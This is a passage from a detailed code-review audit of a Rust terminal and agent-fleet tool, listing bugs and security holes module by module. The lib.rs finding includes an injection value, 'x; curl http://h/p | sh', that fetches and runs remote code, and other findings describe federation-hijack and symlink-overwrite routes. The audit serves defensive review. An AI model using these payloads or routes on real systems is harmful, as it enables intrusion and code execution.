has no test coverage at all

### `src/cli/tasks.rs`

tasks.rs:138-148 the Announce arm is the ONE fold arm without a (ts, id) tie-break — Bid/Award/Done all compare with newer() at :114, Announce uses a bare strict "n.ts < entry.announced_ts", so when two announcements share a timestamp the winner is whichever the slice happened to present first; that decides title, announced_by and HOME, and home is documented at :34-39 as the answer to "who may hand out this task", so two gossiping hosts holding the identical entry set can disagree about a tasks home — a direct violation of the modules stated property 1 ("the fold is a function of the set, not the sequence"), and the order-independence test at :321-338 misses it because no two entries in board() share a ts; tasks.rs:142 the same arm uses announced_ts == 0 as its "unset" sentinel, so a single announce carrying ts 0 (a legitimate u64 value, and merge_into_blackboard validates nothing that arrives by gossip) leaves the sentinel permanently true and INVERTS the rule to last-writer-wins: every later announce for that task overwrites title and home, i.e. any peer can take over the home of a task it did not announce; tasks.rs:163-172 the Award arm does entry.awarded_to.clone_from(&n.to) with no check that an award actually names anyone, while the Bid arm at :150 explicitly skips a bid whose from is None — so an award entry with to: null CLEARS the award, and because award_at now holds that entrys (ts, id) as the newest, the real earlier award can never win the comparison again: a null award is a permanent un-award primitive; tasks.rs:180 Done applies n.ok.unwrap_or(TRUE), so an entry that merely says {kind:done, task:X} with no ok field marks the task successfully complete — combined with :92-93 (is_takeable excludes Done and Failed) that single unvalidated field retires the task for everyone; recovery exists only through backlog.rs:200, which re-announces a Done/Failed task after cooldown_days (default 30, lib.rs:1117-1119) and only when the id is still produced by a backlog SOURCE — an ad-hoc announced task that anyone marks done or failed is gone from the fleet permanently; tasks.rs:158 a bid with no cost is folded as cost 0 and the sort at :190 is cheapest-first, so the cheapest possible bid is the one that omits the field, and nothing rejects a NEGATIVE cost either: a single i64::MIN bid wins every auction on every host forever; tasks.rs:110-195 the fold walks the entire blackboard and allocates an owned String key per entry into four BTreeMaps, and it is re-run from scratch on every call — sweep.rs:88, api/fleet_route.rs:37 and eight separate sites in work.rs — against a log that is grow-only and never compacted (see the gossip audit), so board reads get linearly slower for the life of the fleet with no cursor or cache; tasks.rs:217-221 rank_tasks uses sort_by_key with t.id.clone() in the key, and sort_by_key evaluates the key on every comparison, so ranking allocates O(n log n) Strings for a tie-break that almost never fires; tasks.rs:253-257 format_task puts awarded_to and, failing that, the leading BIDDER in the same column, so "awarded to agent-c" and "agent-c is currently winning the auction" render identically apart from the state word

### `src/cli/team.rs`

team.rs:805-821 handoff writes DIRECTLY into the peer tab's filesystem and its doc at :759-760 claims it 'mirrors the upload route', but api/files.rs::upload does five things this does not: refuses a locked tab (423), sanitises the basename, canonicalises inbox and checks it is a real directory inside the tab's cwd (the symlink guard at api/files.rs:101-120), stages with O_EXCL then renames, and caps at 100 MiB. Here a symlinked inbox/ or a pre-planted inbox/<name> symlink redirects std::fs::copy — which follows symlinks at the destination — to overwrite an arbitrary file, create_dir_all happily materialises inbox/ wherever cwd now points, and a locked tab is written anyway. Two paths to one feature, and the unhardened one is the one agents call; team.rs:77-82 fetch_tab_views collects into Result, so ONE malformed tab fails the entire listing — the exact failure its own doc comment at :67-68 says must not happen ('One tab missing an optional field must not sink the whole /tabs listing'). null_to_default patched a single field; the structural problem the comment describes is untouched; team.rs:496-505 vs :704 the two write paths mint ids from DIFFERENT content strings — append_entry hashes from/task/msg/kind/cost while note_at hashes from/topic/msg — so the same logical note written through the two paths gets two ids and never de-duplicates, and append_entry ignores topic entirely so two notes differing only by topic collide onto ONE id and one is silently dropped by merge_notes. mint_id also uses ts in SECONDS (:527, :701), so the same host posting the identical note twice within one second mints the same id and the second vanishes — the grow-only-set claim at :274-277 does not hold against the module's own writers; team.rs:467-489 merge_into_blackboard is read-modify-append with no lock: two concurrent gossip merges both read the same 'have', both compute the same 'new', and both append, so the file accumulates duplicate lines for the same id without bound; team.rs:719-722 the comment claims append mode keeps concurrent writes line-atomic, which only holds below the pipe-buffer size — notes are agent-authored text with NO length cap anywhere, so a large note interleaves, and parse_notes (:575) then silently drops the corrupted line, losing both writers' entries with no error; team.rs:454-455 the blackboard has no compaction, rotation or size cap, and every note, every notes, and every GET /blackboard read_to_string's the whole file — a long-running fleet makes each write O(entire history); team.rs:401-442 origin_id returns the ORIGIN cache at :402 before it ever consults BLACKBOARD_OVERRIDE at :407, so once the default identity is cached, redirecting the board yields the default origin anyway — precisely the inheritance the comment at :405-406 says it prevents; team.rs:408 it also derives the host half from /etc/hostname rather than the running hostname, which in a container is the image's value and under a hardened unit may be unreadable (falling back to the literal 'host'), and the disambiguating suffix is stored beside the blackboard in the state dir — so a cloned VM image carrying its state dir reproduces BOTH halves identically, defeating the uniqueness argument for the exact cloned-VM case the doc at :390-393 cites as motivation; team.rs:177-199 resolve_target tries name before index, so a tab renamed to a bare number silently shadows that index and the message goes to the wrong agent with no warning — the ambiguity error at :182-188 only covers duplicate names, not name-versus-index. Targeting by t.index is also positional, so a tab closing between a peers listing and the follow-up command re-points it at a different agent; team.rs:641+155+674 the flag parsers treat an unknown flag as the positional argument and then silently discard everything after it, so 'note --topc x msg' posts the string '--topc' as the note body, drops the real message, and exits 0; 'notes mytopic' silently ignores the topic and lists everything; team.rs:613-618 --since indexes into file order, but gossip appends merged peer entries at the END regardless of their timestamps, so a polling agent sees older notes arrive as new and format_note (:623-627) prints no timestamp to reveal it

### `src/cli/tokens.rs`

tokens.rs:18+42+79 all three verbs take `_args` and ignore it entirely, so every flag is silently accepted and discarded — `rotate-tokens --dry-run` performs a REAL rotation, `reset-master-token --help` resets the master token, and neither irreversible credential-revoking command has a --yes, a confirmation prompt or a dry run; a typo on these two commands locks out every existing client with no way to undo it; tokens.rs:50-53+87-90 both destructive calls go through share_link::agent() (share_link.rs:105-110) which sets a 3-SECOND global timeout — a slow daemon makes the request time out client-side while the server has already rotated and persisted the new token, and the CLI then prints 'reset-master-token: <timeout>' and exits 1, telling the user nothing happened at the exact moment every client got locked out; the operation is not idempotent and there is no way to distinguish 'not done' from 'done but unacknowledged'; tokens.rs:56-63 rotate() does `.ok().and_then(..).unwrap_or(0)`, so a 200 whose body it cannot parse or that lacks the `revoked` key prints '✓ revoked share tokens on 0 tab(s)' and returns exit 0 — a failure to understand the daemon is reported with a checkmark and a success code, indistinguishable from 'there was nothing to revoke'; tokens.rs:104-106 reset_master prints '# master API token reset — old token now 401s, new one written to api.token', a claim about a durable side effect it never verifies: it only saw a token in the response body, and if the daemon failed to persist api.token the CLI still asserts it was written; tokens.rs:19-26 show() prints whatever discover_endpoint returns with no emptiness check, and discover_endpoint's env-var branch (share_link.rs:72-77) has NO is_empty guard while its file branch (:92) does — so TAB_ATELIER_API_TOKEN set to the empty string makes `tab-atelier token` print a blank line and exit 0, and the documented `TOKEN=$(tab-atelier token)` idiom silently sets TOKEN='' so every later call 401s with no clue why; tokens.rs:28-32 the printed hint teaches `curl -s <url>/tabs -H \"Authorization: Bearer \$(tab-atelier token)\"` — command substitution happens before exec, so the master token becomes an argv element of curl, visible in world-readable /proc/<pid>/cmdline to every local user for the life of the request and recorded in shell history; the module's own doc at :15 recommends the safe `TOKEN=$(…)` form, and the hint it actually prints contradicts it; tokens.rs:26 show() writes the master token to stdout unconditionally, with no TTY check and no confirmation, so a stray invocation in a logged CI job, a tmux capture or a screen share exposes full API control — every other output in this file is deliberately routed to stderr precisely because stdout is expected to be captured; tokens.rs:5-10+79 the module presents itself as the 'Token-management CLI' but covers only the master and per-tab share tokens: the remote/sidecar token (lib.rs:1788) and the relay token have no rotate verb here at all and can only be rotated by deleting their files by hand, so the one command a user reaches for after a suspected leak silently leaves two live credentials in place; tokens.rs:62+104 neither command offers --json while sibling verbs (tabs, fleet) do, so a script wrapping a rotation has to parse a decorated human string containing a '✓'

### `src/cli/work.rs`

work.rs:151-176 done() never checks the caller holds the lease or that the task even exists — any agent can post a Done note for another agent's in-flight task id (or a typo'd id, which fold_tasks then materialises as a phantom Done task), and the release at :173 is fired with whoami() as holder and swallowed by `let _`, so a rejected holder-mismatch release is indistinguishable from a real one; work.rs:164-174 that swallowed release is the only cleanup path: if the home host is unreachable or the daemon errors, the lease stays parked for the full TTL and nothing is printed — the exact opposite of take()'s :394-395 policy that an unreachable home 'must never be silent'; work.rs:371+396 `ttl_s * 1000` is an unchecked u64 multiply on a value parsed straight from --ttl with no upper bound: `--ttl 18446744073709552000` panics in debug and wraps in release into a tiny lease, and `--ttl 0` is accepted outright and mints a lease that has already expired, so take() prints '(leased … for 0s)' and returns 0 while the task is instantly free for the next agent; work.rs:228-241 take_claim's doc promises the holder's name ('their name is printed by the caller') but it returns the hardcoded literal "held" for every 409, and take()'s :389 `Ok(Some(_)) => {}` discards even that — a collision is silent, so an operator watching take() skip tasks cannot tell who holds them; work.rs:394-401 the away-fallback path swallows a genuine local transport failure: `matches!(take_claim(..), Ok(None))` treats Err the same as a 409 and `continue`s, so a dead local daemon reached via an away task exits 3 ('nothing free') instead of the 1 that the identical failure produces at :403 for a local task; work.rs:375-378 the award note that makes the lease visible to other agents is appended with `let _ = append_entry(n)` — a blackboard write failure leaves the lease held but the board showing Open, and take() still prints success and returns 0, so the board and the lease table diverge with no signal; work.rs:49-53 identity_from's `.or(tab_id)` short-circuits on a *present but blank* TAB_ATELIER_AGENT: the blank Some wins the `or`, trim+filter then drops it, and a perfectly good $_TAB_ID is skipped in favour of `cli@origin` — the :430 test only covers blank-override-with-no-tab-id, so this shadowing is untested; work.rs:156-157 done() strips `--fail` from ANY position, including inside the result text, so `done t1 \"build broke on --fail handling\"` silently records the wrong message and, worse, flips the task to Failed — a result mentioning the flag changes the recorded outcome; work.rs:110-127 bid() puts no lower bound on --cost (i64), so a negative bid wins every auction — the same defect the :583-585 test claims to guard against by rejecting a missing cost — and a repeated --cost silently keeps the last one while unrecognised flags fall through into the note text; work.rs:180-196+260-262 tasks() and fleet() silently ignore unknown arguments (`tasks --json` prints the text form and exits 0) while take() at :339-342 rejects them with exit 2 — the same typo is fatal in one verb and invisible in another

### `src/event_proxy.rs`

event_proxy.rs:97 the `_ => return` catch-all silently swallows the OTHER reply-bearing alacritty events — `TextAreaSizeRequest(formatter)` (CSI 14t/16t pixel-size queries) and `ClipboardLoad(_, formatter)` (OSC 52) both hand over a formatter whose answer must travel back into the PTY, exactly like ColorRequest — so those queries hang and time out, reproducing for them the precise failure (:10-13) this module exists to fix; event_proxy.rs:55+62+69+99 every lock uses `if let Ok(..)`, so a single poisoning silently and permanently disables the proxy: set_notifier becomes a no-op and send_event stops forwarding PtyWrite for the rest of the process life, with no log, no counter, no recovery — the crate's own convention elsewhere is unwrap_or_else(PoisonError::into_inner), which keeps working; event_proxy.rs:93-94 vs :99 the poisoning policy is inconsistent inside one function: a poisoned theme/bg_override degrades gracefully to defaults and still answers, while a poisoned notifier drops the answer entirely — the same fault produces a wrong-colour reply on one path and total silence on the other; event_proxy.rs:99-103 the notifier Mutex is held ACROSS `sender.send()`; the guard from `self.notifier.lock()` is alive for the whole `if let` body, so a slow or full channel blocks every other thread trying to set_notifier or emit a reply behind a lock that is only meant to guard a slot assignment; event_proxy.rs:102 `let _ = sender.send(..)` discards the send result: a closed or full channel drops a DSR/DA reply with no signal at all, which is indistinguishable at the far end from the no-op default impl the module was written to replace — the caller waiting on the probe just times out; event_proxy.rs:14-15+54-58 the doc claims dropping events before set_notifier 'is fine because no PTY exists to read them yet', but the notifier is installed only after EventLoop::spawn returns and that same event loop is what runs the child — a shell that emits ESC[6n in its first prompt (reedline, starship) can land in the gap and its reply is dropped forever, with nothing to retry it; event_proxy.rs:30+37-38+93 EventProxy derives Default, so `theme` starts at ThemeName::default() until TerminalView::set_theme lands: a colour query answered in that startup window returns the DEFAULT palette rather than the tab's, and apps cache the bg they are told once — producing exactly the highlight clash described at :39-43, just at startup instead of on a theme change; event_proxy.rs:80-83 ChildExit(_) throws the exit status away and only sets a bool, discarding at its single point of availability the one piece of information a tab manager needs to distinguish a clean shell exit from a crash; event_proxy.rs:50 `exited` is the only pub field while every other piece of state has a private setter, so any holder of a clone can store(false) and silently un-exit a dead tab

### `src/federation.rs`

federation.rs:78-95 + cli/gossip.rs:84-85 the origin->endpoint binding is taken verbatim from a peer's OWN /blackboard JSON ('origin' field) with zero verification that the name has anything to do with the endpoint we contacted, and line 87 overwrites an existing binding unconditionally ('a peer that moved is the same peer') — so the LAST peer to claim a name wins. One misconfigured or compromised peer can claim origin 'build-box' and permanently rebind build-box's authority to itself; claim_endpoint (cli/work.rs:214) then routes every lease request for build-box's tasks to the attacker, who can grant them all (duplicate holders fleet-wide) or deny them all (denial of work). This is a lateral authority hijack inside the one module whose entire job is deciding who is authoritative; a peer can also claim OUR origin — endpoint_for:104 makes that inert for routing, but it still lands in the file and is published by api/fleet_route.rs:44; federation.rs:83-94 remember() is an unsynchronised read-modify-write finished by a truncating std::fs::write: the GUI, the headless daemon and the CLI all share state_base_dir(), so two concurrent gossip rounds interleave load->insert->write and silently lose a binding, and a crash mid-write leaves a truncated federation.json. Every other state writer in this tree uses tmp+rename; this one does not; federation.rs:69-72 load() maps a malformed/truncated file to Directory::default() with no log — corruption is indistinguishable from 'never gossiped', so the whole learned directory can vanish silently and every task falls back to local authority, i.e. the exact duplicate-holder failure the module doc (23-27) exists to bound. The doc justifies 'missing or unreadable = empty'; corrupt is a different case with a different consequence; federation.rs:79 vs 104 asymmetric normalisation: remember() trims the origin before storing, endpoint_for() does not trim before looking up, so a home string carrying a trailing space or newline (both come from gossiped JSON) never matches its own stored key and silently falls back to local authority; neither side case-folds either, so 'Build-Box' and 'build-box' are two separate members despite DNS being case-insensitive; federation.rs:103-108 + cli/work.rs:210-225 endpoint_for returns None for BOTH 'never heard of this origin' and 'I know this task's home but its endpoint is gone', and claim_endpoint collapses them into the same silent local fallback with None as the reason — so the dangerous case (a known remote authority that is unroutable, the confederal escape hatch that the doc says costs a duplicate) is never logged at the moment of the decision, and when the duplicate surfaces at done time there is no record of why; the test at 147-149 asserts this collapse as if it were desirable; federation.rs:107 endpoint_for calls load() — a disk read plus a JSON parse — on EVERY task take, and remember() re-reads and rewrites the whole file per peer per gossip round; there is no in-memory cache anywhere; federation.rs:37+87 members never shrinks: there is no forget, no prune and no TTL, so a decommissioned host, a renamed VM or a DHCP hostname change leaves a permanent dead binding that endpoint_for will happily resolve if the endpoint id is ever reused; federation.rs:56-62 path() falls back to the DEFAULT file when the PATH_OVERRIDE RwLock is poisoned (.ok() swallows it), so a poison silently moves the directory out from under an ops override rather than failing loudly

### `src/fleet.rs`

fleet.rs:244-257 a works_on edge is emitted whenever awarded_to is set, with NO check of t.done — so every COMPLETED task on the board renders as an award with leased:false, which the module doc at :26-30 defines as the alarm state ('the agent said it was working and then died'). Since finished tasks stay on the board, the graph's one signal is drowned in false alarms from normal completions, and no test covers it (the helper at :268 is only ever called with done=None); fleet.rs:255 leased is computed as claim.is_some_and(|c| c.holder == *who) and NEVER checks expiry, even though now_ms is threaded in and used one line later for remaining_ms and crate::claims::Claim has expiry helpers — a lapsed lease is reported leased:true with expires_in_ms saturated to 0, so 'lease lapsed while it was thinking', the exact case the doc says a human is scanning for, renders as healthy. Every test uses expires 60_000 with now_ms 0, so the expired path is untested; fleet.rs:168-169 the live map is built with .collect() into a BTreeMap keyed by claim key, which silently keeps the LAST duplicate in iteration order and ignores Claim::fence entirely — with two claims for one key (a stale one plus the fresh fenced one, exactly what fencing exists to disambiguate) the wrong holder can win and flip leased to false for a genuinely-held task; fleet.rs:84+146-166+211-221 agent identity is the tab NAME, which is not unique across the fleet (nor even on one host — app.rs:1808-1812 reuses names after a close), so two different agents called 'worker' on two federated hosts collapse into ONE agent node carrying both their works_on edges, and only the local one gets a runs_on edge; fleet.rs:188-199 a host discovered solely as a task's home is pushed with status 'peer' although it is in neither the peers map nor any peer edge — the doc at :24 defines peer as 'a federation link we have learned' and at :110-111 explicitly contemplates a home 'we can't reach', so an unreachable host is labelled reachable while the graph draws no link to it; fleet.rs:135+158+200+224+235+247 push_node de-duplicates nodes through the have set but every EDGE is pushed unconditionally, so the same task id arriving from two federated boards (the expected case for a merged board) duplicates its announced/bid/works_on edges, and a bidder listed twice in t.bids yields two bid edges with possibly different cost labels; fleet.rs:179-183 the node label is the task title verbatim — agent-authored free text with no length cap and no sanitisation — serialized into a graph a browser renders, so a multi-kilobyte title becomes a node label with nothing bounding it; fleet.rs:93-100 build has no cap on output size at all: edges are O(tasks x bidders) and the whole graph is serialized into one response with no pagination or truncation; fleet.rs:40+57 kind is a String on both Node and Edge rather than an enum, so the six documented edge kinds and three node kinds are stringly-typed at ten construction sites and a typo produces a silently unrenderable graph instead of a compile error

### `src/headless.rs`

headless.rs:1250-1256 the snapshot is refreshed ONLY when a consumer is judged present (tick_interval fast, i.e. activity within the last 2s, or a live WS viewer), so a one-shot HTTP consumer gets STALE data by design: 'tab-atelier output <tab>' or any script polling /output less often than every 2s bumps activity, is served the snapshot built for the PREVIOUS request, and only then goes hot — every call returns the screen as of the last call; the comment at :1252-1254 frames this as a harmless one-off, but for the CLI output verb it is the steady state; headless.rs:780+786+1165-1207 the entire graceful-shutdown block (final persist, SIGHUP, cgroup SIGTERM, 5s grace, SIGKILL sweep) is reachable only via SHUTDOWN_REQUESTED, which is set only by the ctrlc handler in bin/tab-atelier-headless.rs:88 — and Cargo.toml:139 pins ctrlc with default-features=false, so its termination feature is off and SIGTERM is never caught; under systemd (KillSignal=SIGTERM) none of this runs, contradicting the doc at :780 ('until SIGINT/SIGTERM') and :786 ('Ok(()) on a clean shutdown via SIGTERM'); headless.rs:1167-1206 even when it does run, the final persist happens BEFORE the tabs are asked to stop, so everything an agent prints during the 5s SIGTERM grace — including its farewell output and anything it flushes on exit — is never saved; the shutdown that exists specifically to let claude finish writing does not capture the result; headless.rs:898+972 the restore loop derives is_active from tabs.len() (the count of tabs that spawned SUCCESSFULLY), so a single spawn_pty_tab returning None at :912 shifts every later index: the eager scrollback restore is applied to the wrong tab and 'active = saved.active.min(...)' at :972 selects a tab the user never had focused, silently; headless.rs:1305-1309 the auto-resume sweep types Ctrl-U plus the resume command blind once created_at is 500ms old, with no check that the shell actually printed a prompt and no retry — on a loaded host or a slow network cwd the command is swallowed by a shell that was not ready and the agent silently never resumes, while the comment at :1303-1304 asserts the prompt is there; headless.rs:1722-1732 the dirtiness gate is dead code: the block is already inside 'if !read_only && final_flush', so the 'if !final_flush && ring_len unchanged' test at :1731 can never be true — the comment at :1724-1729 describes a skip that cannot happen; headless.rs:1700-1714 to_string_pretty(&saved).unwrap_or_default() yields an EMPTY string on a serialisation failure, whose crc32 differs from last_state_hash, so the failure path writes an empty tabs.json and destroys the whole tab list rather than skipping the write; headless.rs:1143-1148+1165 the shutdown flag is polled at the top of the loop but nothing notifies the condvar the loop parks on, so a signal arriving just after the park waits out the full tick — up to 250ms at TICK_IDLE — before teardown begins; headless.rs:1191-1206 every step of the teardown beyond the PTY close is cfg(target_os=linux), so on macOS and Windows shutdown degrades to SIGHUP-only with no subtree termination and no orphan sweep, silently; headless.rs:302-303 vs :862-863 vs :908-911 the same grid dimension is clamped to three different minimums in one file (max(2)/max(1), max(4), max(2)/max(1)), so a pinned restore can produce a 2-column grid the settings path explicitly refuses to configure; headless.rs:944-951 restoring a flagged agent_daemon tab sets pending_restore = None, silently discarding that tab's persisted scrollback, which no comment on that line mentions; headless.rs:848-855 the half-configured-TLS fallback warns only through log::warn at startup, i.e. into the file logger that lib.rs:1008 declines to install when no filter is configured — the operator's only signal that TLS silently downgraded to self-signed can land nowhere

### `src/http3.rs`

http3.rs:141+94 the send and receive paths disagree on the frame limit: read_frame REJECTS any length over MAX_FRAME_BYTES (2 MiB) as an error, but pump_output frames r.since(offset) with NO cap — the very first frame of a connection with since=0 carries the whole PtyRing (scrollback runs to ~10k rows), so the peer's read_frame errors out and kills the stream; the same happens any time a build or a cat produces >2 MiB between two notifications. The producer must chunk to MAX_FRAME_BYTES; http3.rs:61-68 frame() is pub, takes any payload and casts body_len to u32 with no check, so a >4 GiB payload silently truncates the length header and desynchronises the stream — the only guard lives on the read side; http3.rs:118-147 pump_output has no exit path other than a write error, and it parks on notified.await while the tab is quiet — a client that disconnects mid-silence leaves the task, the SendStream and the ring's Notify registration alive indefinitely; the doc at 110 says 'runs until the stream errors', but a quiet stream never errors; http3.rs:118+135 the caller-supplied 'since' offset is passed straight to PtyRing::since, which clamps to base_offset (pty_ring.rs:387) — if the requested offset has already been evicted from the ring the client silently receives a GAP with no marker and no way to detect it, which defeats the point of a byte-offset resume; http3.rs:72-81+98-100 a mid-frame EOF is indistinguishable from a clean close: read_exact returns Ok(false) both for a genuine end-of-stream and for a peer that died after sending the 4-byte length header, and read_frame turns that into Ok(None) = graceful end; a truncated frame should be an error. Treating Some(0) as EOF (line 76) has the same hazard if wtransport ever yields a zero-length chunk without closing; http3.rs:185-200 run_echo accepts unlimited concurrent sessions with NO authentication — unlike every other surface in this crate, which is token-gated — and echoes attacker-supplied bytes back; bound to anything but loopback that is a UDP reflector, and read_exact (72-81) has no read timeout, so a peer dribbling one byte at a time pins a task plus its buffer for free; http3.rs:202-214 handle_session echoes streams SEQUENTIALLY — accept_bi() is not called again until the current stream ends, so a client that opens a second bidi stream is stalled until the first finishes; http3.rs:163-175 cert_hash_hex returns an EMPTY STRING on an empty chain instead of Option/Result, so the failure propagates silently into whatever builds the serverCertificateHashes value and surfaces much later as an opaque browser connect failure; http3.rs:230 vs 163 the round-trip test pins the cert using wtransport's own .hash() and never calls cert_hash_hex — the only coverage of the production hash function is the 64-hex-chars shape assertion at 286-291, so if cert_hash_hex hashed the wrong bytes every test would still pass; http3.rs:22-23+155-157 the doc records that the cert must be <=14 days valid but nothing rotates it — a daemon running longer than that serves an expired cert whose pinned hash browsers refuse, with no renewal path in this module; http3.rs:102 body.split_off(1) allocates and copies the entire payload once per frame purely to strip the leading tag byte

### `src/lib.rs`

lib.rs:810-825+874-883+958-989 COMMAND INJECTION via agent_session_id: build_agent_resume_command interpolates session_id raw into "claude --resume {id}" / "catbus-agent --resume {id}", wrap_exec_command puts that straight into the bash -c script (it shell-quotes the tracer path, the log path and the proctitle with agent_probe::sh_squote right beside it, but never the command), and api/status.rs:72-75 accepts sessionId as an arbitrary string with ZERO validation — no uuid parse, no charset gate — then persists it as TabState::agent_session_id; on the next respawn headless.rs:552 execs bash -i -c "...exec claude --resume <id>", so a sessionId of "x; curl http://h/p | sh" runs arbitrary shell, and the typed path (headless.rs:692/950) reproduces it by typing the same string into the shell; every tab gets TAB_ATELIER_API_URL+TOKEN in its env and the route takes the TARGET tab id from the path, so any process in any tab can plant this on ANY OTHER tab and get code execution outside its own net confinement; lib.rs:1190-1196+785-804 TabState::agent_daemon documents that it is "set by the daemon itself at startup, so an unrecognised agent_kind alone never becomes a command line", but api/status.rs:76-81 takes both agentKind and daemon straight from the request body — so an in-tab caller can mark any tab as a daemon with any lowercase verb and make restore run our own binary with that subcommand (is_daemon_kind only excludes catbus/claude, so tab-atelier take / sweep / other stateful verbs are reachable); the charset gate bounds the damage but the stated invariant is simply not enforced; lib.rs:697-709 kill_tab_pgroup sends TERM and KILL back to back in the same loop with no wait between them, so the TERM is decorative: claude is SIGKILLed microseconds later and never flushes its session/transcript — the graceful half of the shutdown does not exist; lib.rs:1093-1115 try_acquire_single_instance_lock returns TRUE (acquired) when create_dir_all or open fails, so a read-only or full state dir silently permits a second instance — and that is exactly the precondition under which agent_reaper.rs (single unscoped agent_procs.json) has the second instance SIGKILL the first ones live agents; the INSTANCE_LOCK.set result is also discarded, so a second call in the same process drops the File and RELEASES the fs2 lock while still returning true; lib.rs:1794-1815 read_or_mint_token has a mint race (two processes each mint, last write wins, the loser keeps a cached OnceLock token that no longer matches the file and every later auth fails until restart) and writes the secret with fs::write BEFORE chmod 0600, leaving a umask-wide window where relay.token / remote.token is world-readable; lib.rs:308-323 refresh_folder_styles gates on mtime equality only — a second write inside the same mtime granularity (or a restore that resets mtime backwards) is never picked up, and the whole preferences file is reloaded through load_preferences, which returns Preferences::default() on any parse error (:3460-3474), so a momentarily-half-written preferences.json silently wipes the in-process folder styles; lib.rs:494-495+487-493 minimal_pty_env drops any kept var whose value is empty, so an intentionally empty LANG or TZ is silently replaced by the parent-less default rather than being passed through; lib.rs:540-555 clear_env_shell_command builds env -i K=V pairs from a HashMap, i.e. in NON-DETERMINISTIC order, and does not reject a key containing = or a newline — a user clear_env_vars entry like "A=B=C" or one with an embedded newline is passed to env(1) verbatim; lib.rs:717-724 api_url_for_local_clients takes the text after the LAST colon, so a bind spec with no port (0.0.0.0) or an IPv6 literal without a port silently yields DEFAULT_API_PORT and every in-tab tool is handed a URL pointing at the wrong port

### `src/locale.rs`

locale.rs:339-346 detect_lang gets POSIX locale precedence wrong: the loop only RETURNS when a var starts with 'fr', so a var that is set to something else does not stop the search — LC_ALL=en_US.UTF-8 with LANG=fr_FR.UTF-8 yields French even though LC_ALL is defined to override everything. The first var that is SET must decide, not the first that happens to match; locale.rs:342 starts_with(\"fr\") over-matches the language subtag — fry_NL (West Frisian), frr (North Frisian), frp (Arpitan) all get the French UI; the check should compare the subtag up to the first '_', '.' or '@'; locale.rs:339 LANGUAGE is a COLON-SEPARATED priority list (LANGUAGE=de:fr:en), not a locale — treating it as a scalar means only the first entry is ever consulted, so a user whose fallback chain is de:fr silently gets English while 'frr:en' wrongly gets French; locale.rs:340 env::var returns Ok(\"\") for a set-but-empty var, which POSIX says must be treated as unset — here LC_ALL=\"\" is skipped only by accident (it doesn't start with 'fr'), and would become a real bug the moment the loop is fixed to stop on the first set var; app.rs:883-885 + app.rs:5962-5963 hold the only Lang<->\"en\"/\"fr\" string mapping, duplicated and OUTSIDE the module that owns the enum, and the parse side uses a  wildcard — so adding a Lang variant compiles clean and silently falls back to detect_lang() for the new code; locale.rs has Lang::ALL for iteration but no code()/from_code(), which is where that pair belongs; locale.rs:26 the unconditional #[allow(dead_code)] on Strings (on top of the module-level cfg_attr at :7) permanently suppresses unused-field warnings in GUI builds too, so strings dropped from the UI are never flagged and the struct only grows — locale.rs:28-29 terminal and terminal_n are already identical in both languages, a plural/numbered variant that was never differentiated; locale.rs:374-378 detect_lang_defaults_to_en asserts nothing () despite its name promising the default, so none of the precedence logic above has any coverage; locale.rs:286+333 French uses a plain ASCII space before ':' ('Renommer l'onglet :', 'Test du point d'accès : OK') where French typography needs a narrow no-break space — the plain space permits a line break before the colon; locale.rs:304 toggle_hotkeys EN 'Toggle hotkeys' vs FR 'Raccourcis d'affichage' are not the same thing (verb phrase vs noun label)

### `src/log_ring.rs`

log_ring.rs:5-15+88-90 the 'always-on ring' is not on in the GUI: install() is only reached from lib.rs:1027, and init_gui_file_logging bails at lib.rs:1008 when resolve_log_filter() returns None — so on a desktop instance with no configured filter (the default) no logger is ever installed, the ring stays permanently empty, and GET /logs (api.rs:1883) plus 'tab-atelier logs' return an empty list with no explanation; headless.rs:794-804 gets this right by always building a logger and always installing, so the two binaries disagree on the module's central claim, and it fails in exactly the 'misbehaving right now' case the doc at :7-11 was written for; log_ring.rs:129-133 install() swallows the already-installed case with no return value, so neither caller can warn — a stray env_logger::init() anywhere earlier silently disables /logs for the process lifetime with zero diagnostic (returning bool or Result would cost nothing); log_ring.rs:102-104 enabled() returns true for anything at RING_LEVEL or below regardless of the inner filter, which changes the meaning of log_enabled!() for every call site: code that guards an expensive Debug dump behind log_enabled!(Level::Info) now always pays for it even though :107 correctly suppresses the output — the doc at :87-90 promises existing behaviour is 'intact', which holds for what gets printed but not for what gets computed; log_ring.rs:115 record.args().to_string() fully materialises the message BEFORE clamp_msg sees it, so MAX_MSG bounds retention only — a runaway Debug dump still allocates its full size (and clamp_msg then walks it twice, chars().count() at :77 then chars().take() at :80), which is not what :24 'a runaway Debug dump can't blow the ring's memory' implies to a reader; log_ring.rs:114 target is pushed unclamped, unlike msg — fine for module paths but not for any log!(target: <dynamic>) call site; log_ring.rs:57-61 tail() clones up to 500 Lines (worst case ~4 MB with MAX_MSG at 2000 chars) while holding the single global mutex that every log! call in the process contends on, so a GET /logs?lines=500 stalls all logging threads for the duration; the same 4 MB worst case makes the ':20-22 rounding error next to a tab's scrollback' claim optimistic; log_ring.rs:48 uses len() == CAPACITY rather than >=, which is correct only because push is the sole growth path — a defensive >= costs nothing; tests cover only push/tail/clamp_msg: RingLogger's log/enabled/flush and install() — i.e. the entire wrapping layer where the enabled() semantics change and the install race live — have no test at all

### `src/main.rs`

main.rs:64 vs 68-77 the READ_ONLY / claude-only / relay globals are stored AFTER cli::dispatch::dispatch(), which process::exits inside (dispatch.rs:758-762) — so 'tab-atelier --read-only <any subcommand>' parses happily and runs that subcommand with read_only() still false; the flag is a top-level global on the shared Cli, and lib.rs:92-94 documents read-only as 'never writes any persisted state', which is simply untrue for every one of the subcommand paths; --claude-only and --relay are silently dropped the same way; main.rs:46 + app.rs:6798 the clap migration celebrated in the comment at :28-36 ('no longer silently launching the GUI on a typo') makes from_arg_matches exit 2 on any flag not in the Cli struct, and --check is NOT in that struct (dispatch.rs only has check_crypto) — so the raw std::env::args scan at app.rs:6798 and the whole run_check() path are now unreachable in this binary; main.rs:88-90 ctrlc::set_handler's Result is discarded, so if installation fails Ctrl-C keeps the default disposition and kills the GUI without the shutdown flush, with no warning; and when it succeeds the handler only sets a flag, so a wedged gpui loop can no longer be Ctrl-C'd at all — there is no second-Ctrl-C escape hatch, the user has to SIGKILL; main.rs:79 --read-only opts out of the single-instance lock entirely, so any number of read-only instances can run beside a normal one and the 'never writes' invariant rests wholly on every write path remembering to call read_only() (lib.rs:98) — a global with no compile-time enforcement and no test asserting a read-only instance leaves disk untouched; main.rs:50-55 --check-crypto exits(0) before dispatch, so it silently swallows any subcommand on the same line, and it binds the ServerConfig to _config and drops it immediately, proving only that the builder did not panic — it never resolves a cert, which is the part that actually 